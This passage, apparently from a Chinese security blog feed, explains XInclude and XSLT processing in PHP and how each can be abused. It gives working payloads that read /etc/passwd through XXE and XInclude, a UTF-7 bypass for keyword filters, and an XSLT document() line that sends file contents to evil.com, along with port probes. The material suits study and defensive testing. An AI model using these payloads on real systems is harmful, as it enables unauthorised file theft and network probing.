class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"test.xml"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xi:fallback</span>&gt;</span>Sorry, the file is unavailable<span class="tag">&lt;<span class="name">xi:fallback</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>此时解析xml后，若test.xml不存在，则会解析获取到<code>Sorry, the file is unavailable</code></p><h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p>看完上述内容，一定会有人问，为什么不直接使用外部实体引入就好了？<br>这里官方文档也给出了详尽的解释：<br>XML 外部实体有很多众所周知的局限和不便于使用的含义，这些因素极大地妨碍了 XML 外部实体成为多用途包含工具：</p><ul><li>XML 外部实体无法成为一个成熟的独立 XML 文档，因为它既不允许独立的 XML 声明，也不允许 Doctype 声明。这实际上意味着 XML 外部实体本身无法包括其他外部实体。</li><li>XML 外部实体必须是格式规范的 XML</li><li>未能加载外部实体是重大错误 (fatal error)；严格禁止任何恢复。</li><li>只能包括整个外部实体，无法只包括文档的一部分。</li><li><p>外部实体必须在 DTD 或内部子集中进行声明。<br>等等，外部实体？讲到安全问题，你是否立刻就想到了XXE（XML External Entity Injection）任意文件读取的问题？<br>没错，xinclude作为外部实体引用的替代品，同样具有XXE的问题，并且还有一些特别的地方：</p><h4 id="传统的XXE文件读取"><a href="#传统的XXE文件读取" class="headerlink" title="传统的XXE文件读取"></a>传统的XXE文件读取</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;?xml version = "1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">    &lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;f;&lt;/x&gt;</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line"><span class="comment">// let's have a nice output</span></span><br><span class="line">$dom-&gt;preserveWhiteSpace = <span class="keyword">false</span>;</span><br><span class="line">$dom-&gt;formatOutput = <span class="keyword">true</span>;</span><br><span class="line"><span class="comment">// load the XML string defined above</span></span><br><span class="line">$dom-&gt;loadXML($xml);</span><br><span class="line"><span class="comment">// substitute xincludes</span></span><br><span class="line"><span class="keyword">echo</span> $dom-&gt;saveXML();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是访问该页面，我们却发现并没有解析xml<br><img src="/images/2018-08-13-11-26-06.png" alt=""><br>这是因为<br>php的xml库的底层库是libxml2，而在2.6版本之后，改库已默认禁用外部实体引用的解析<br>我们可以使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> LIBXML_DOTTED_VERSION;</span><br></pre></td></tr></table></figure></li></ul><p>来查看当前版本号<br><img src="/images/2018-08-13-11-36-00.png" alt=""><br>所以我当前的xml解析已默认不支持外部实体引入了<br>故此我们查阅php手册中的<code>libxml option constants</code><br>可以发现使用<code>LIBXML_NOENT</code>选项即可加载外部实体<br>所以关键代码更改为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dom-&gt;loadXML($xml,LIBXML_NOENT);</span><br></pre></td></tr></table></figure></p><p>即可：<br><img src="/images/2018-08-13-11-34-24.png" alt=""></p><h4 id="传统文件读取进阶版—过滤"><a href="#传统文件读取进阶版—过滤" class="headerlink" title="传统文件读取进阶版—过滤"></a>传统文件读取进阶版—过滤</h4><p>倘若我们发现外部实体引入时，存在关键词过滤<br>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENTITY</span><br></pre></td></tr></table></figure></p><p>等被过滤，那么我们可以尝试使用utf-7编码<br>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;f;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.motobit.com/util/charset-codepage-conversion.asp</span><br></pre></td></tr></table></figure></p><p>转为utf-7<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+ADwAIQ-DOCTYPE ANY +AFs-</span><br><span class="line">    +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-</span><br><span class="line">+AF0APg-</span><br><span class="line">+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-</span><br></pre></td></tr></table></figure></p><p>然后使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-7&quot; ?&gt;</span><br></pre></td></tr></table></figure></p><p>测试脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="utf-7"?&gt;</span></span><br><span class="line"><span class="string">+ADwAIQ-DOCTYPE ANY +AFs-</span></span><br><span class="line"><span class="string">    +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-</span></span><br><span class="line"><span class="string">+AF0APg-</span></span><br><span class="line"><span class="string">+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line"></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line"><span class="comment">// let's have a nice output</span></span><br><span class="line">$dom-&gt;preserveWhiteSpace = <span class="keyword">false</span>;</span><br><span class="line">$dom-&gt;formatOutput = <span class="keyword">true</span>;</span><br><span class="line">$dom-&gt;loadXML($xml,LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> $dom-&gt;saveXML();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>效果如下<br><img src="/images/2018-08-13-11-51-03.png" alt=""></p><h4 id="xinclude文件读取"><a href="#xinclude文件读取" class="headerlink" title="xinclude文件读取"></a>xinclude文件读取</h4><p>倘若由于需要，我们使用了xinclude<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="string">&lt;root xmlns:xi="http://www.w3.org/2001/XInclude"&gt;</span></span><br><span class="line"><span class="string"> &lt;xi:include href="file:///etc/passwd" parse="text"/&gt;</span></span><br><span class="line"><span class="string">&lt;/root&gt;</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line"><span class="comment">// let's have a nice output</span></span><br><span class="line">$dom-&gt;preserveWhiteSpace = <span class="keyword">false</span>;</span><br><span class="line">$dom-&gt;formatOutput = <span class="keyword">true</span>;</span><br><span class="line">$dom-&gt;loadXML($xml);</span><br><span class="line">$dom-&gt;xinclude();</span><br><span class="line"><span class="keyword">echo</span> $dom-&gt;saveXML();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dom-&gt;loadXML($xml);</span><br></pre></td></tr></table></figure></p><p>我们并没有打开外部实体引用选项，却成功的读取<code>/etc/passwd</code>的内容<br><img src="/images/2018-08-13-11-51-46.png" alt=""><br>这一点值得关注，倘若我们在测试过程中，发现我们可控xml文本内容，但是引入外部实体无效或是存在过滤，尝试编码绕过也不行的时候，那么可以尝试使用xinclude<br>因为xinclude无需使用<code>LIBXML_NOENT</code>选项去开启默认关闭的外部实体引用</p><h2 id="XSLT"><a href="#XSLT" class="headerlink" title="XSLT"></a>XSLT</h2><p>XSL 指扩展样式表语言（EXtensible Stylesheet Language）<br>而XSLT 指 XSL 转换：即使用 XSLT 可将 XML 文档转换为其他文档，比如XHTML。</p><h3 id="简单样例"><a href="#简单样例" class="headerlink" title="简单样例"></a>简单样例</h3><p>下面展示利用php后端语言，将xml转换为html<br>test.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>sky<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blog</span>&gt;</span>skysec.top<span class="tag">&lt;/<span class="name">blog</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">country</span>&gt;</span>China<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>test.xsl<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">"#9acd32"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">th</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Country<span class="tag">&lt;/<span class="name">th</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"blog"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"country"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$xslDoc = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$xslDoc-&gt;load(<span class="string">"test.xsl"</span>);</span><br><span class="line">$xmlDoc = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$xmlDoc-&gt;load(<span class="string">"test.xml"</span>);</span><br><span class="line">$proc = <span class="keyword">new</span> XSLTProcessor();</span><br><span class="line">$proc-&gt;importStylesheet($xslDoc);</span><br><span class="line"><span class="keyword">echo</span> $proc-&gt;transformToXML($xmlDoc);</span><br></pre></td></tr></table></figure></p><p>结果如下<br><img src="/images/2018-08-13-14-41-42.png" alt=""><br>查看源代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">"#9acd32"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>Country<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>sky<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>skysec.top<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>China<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"blog"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"country"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>已被替换成对应的值</p><h3 id="安全问题-1"><a href="#安全问题-1" class="headerlink" title="安全问题"></a>安全问题</h3><h4 id="传统文件读取"><a href="#传统文件读取" class="headerlink" title="传统文件读取"></a>传统文件读取</h4><p>这里的安全问题基本与xml中相同<br>像读文件：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY shit SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"&gt;   </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/root"</span>&gt;</span></span><br><span class="line">  &amp;shit;</span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-08-13-15-57-43.png" alt=""><br>这就很成功的可以读取文件内容了<br>但是需要注意的是，同样因为php底层的libxml库默认禁用了外部实体引入，所以我们还是需要手动加入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$xslDoc = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$xslDoc-&gt;load(<span class="string">"test.xsl"</span>,LIBXML_NOENT);</span><br></pre></td></tr></table></figure></p><h4 id="xsl文件读取"><a href="#xsl文件读取" class="headerlink" title="xsl文件读取"></a>xsl文件读取</h4><p>当没开启外部实体引入的时候，我们可以考虑如下方式</p><ul><li><xsl:include>  / <xsl:import><br>查阅手册，发现该元素必须是 <xsl:stylesheet> 或 <xsl:transform> 的子节点<br>语法为<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"URI"</span>/&gt;</span></span><br></pre></td></tr></table></figure></xsl:transform></xsl:stylesheet></xsl:import></xsl:include></li></ul><p>既然是url，那么利用的方式就有很多种了<br>例如：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p><p>此时报错了<br><img src="/images/2018-08-13-15-29-11.png" alt=""><br>我们尝试用base64<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"php://filter/read=convert.base64-encode/resource=/etc/passwd"</span>/&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-08-13-15-30-07.png" alt=""><br>解base64<br><img src="/images/2018-08-13-15-30-35.png" alt=""><br>这很不爽，因为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> $proc-&gt;transformToXML($xmlDoc)</span><br></pre></td></tr></table></figure></p><p>的原因，我们不能输出完整的信息<br>如果我改成<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> base64_encode($proc-&gt;transformToXML($xmlDoc));</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-08-13-16-44-21.png" alt=""><br>其实是可以成功读取文件内容的，但估计目标不会先base64再帮我们打印出来吧<br>所以有了以下方法</p><ul><li>document()<br>我们结合该函数却可以直接带出数据<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"name1"</span> <span class="attr">select</span>=<span class="string">"document('file:///etc/passwd')"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"name2"</span> <span class="attr">select</span>=<span class="string">"concat('http://evil.com/?', $name1)"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"name3"</span> <span class="attr">select</span>=<span class="string">"document($name2)"</span> /&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="传统端口探测"><a href="#传统端口探测" class="headerlink" title="传统端口探测"></a>传统端口探测</h4><p>话不多说，测试脚本如下<br>当外部实体引用开启时<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [&lt;!ENTITY shit SYSTEM "http://127.0.0.1:9999"&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;shit;&lt;/x&gt;</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line"><span class="comment">// let's have a nice output</span></span><br><span class="line">$dom-&gt;preserveWhiteSpace = <span class="keyword">false</span>;</span><br><span class="line">$dom-&gt;formatOutput = <span class="keyword">true</span>;</span><br><span class="line">$dom-&gt;loadXML($xml,LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> $dom-&gt;saveXML();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>当端口关闭的时候发现<br><img src="/images/2018-08-13-16-09-17.png" alt=""><br>当端口开启的时候<br><img src="/images/2018-08-13-16-09-41.png" alt=""></p><h4 id="xsl端口探测"><a href="#xsl端口探测" class="headerlink" title="xsl端口探测"></a>xsl端口探测</h4><p>上述方法需要开启外部实体引入，而这里只需要使用document()函数即可<br>给出部分代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"sky"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"blog"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"country"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"document('http://127.0.0.1:9999')"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>当端口关闭时<br><img src="/images/2018-08-13-16-34-41.png" alt=""><br>当端口开启时<br><img src="/images/2018-08-13-16-35-18.png" alt=""></p><h3 id="CTF样题"><a href="#CTF样题" class="headerlink" title="CTF样题"></a>CTF样题</h3><p>曾经有做过一道xslt服务端注入攻击的综合题目，有兴趣的可以看这篇wrietup<br><a href="http://skysec.top/2018/03/23/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0xslt%E5%86%8D%E5%88%B0xxe%E7%9A%84%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9B%AE/#%E6%80%9D%E8%80%83%E6%94%BB%E5%87%BB%E7%82%B9">http://skysec.top/2018/03/23/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0xslt%E5%86%8D%E5%88%B0xxe%E7%9A%84%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9B%AE/#%E6%80%9D%E8%80%83%E6%94%BB%E5%87%BB%E7%82%B9</a></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>Xml作为一种标记语言，其中蕴含的技巧还有许多等待探索，我在此抛砖引玉了~很期待有师傅来交流一些XD的姿势~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
      <category term="xml" scheme="http://skysec.top/tags/xml/"/>
    
  </entry>
  
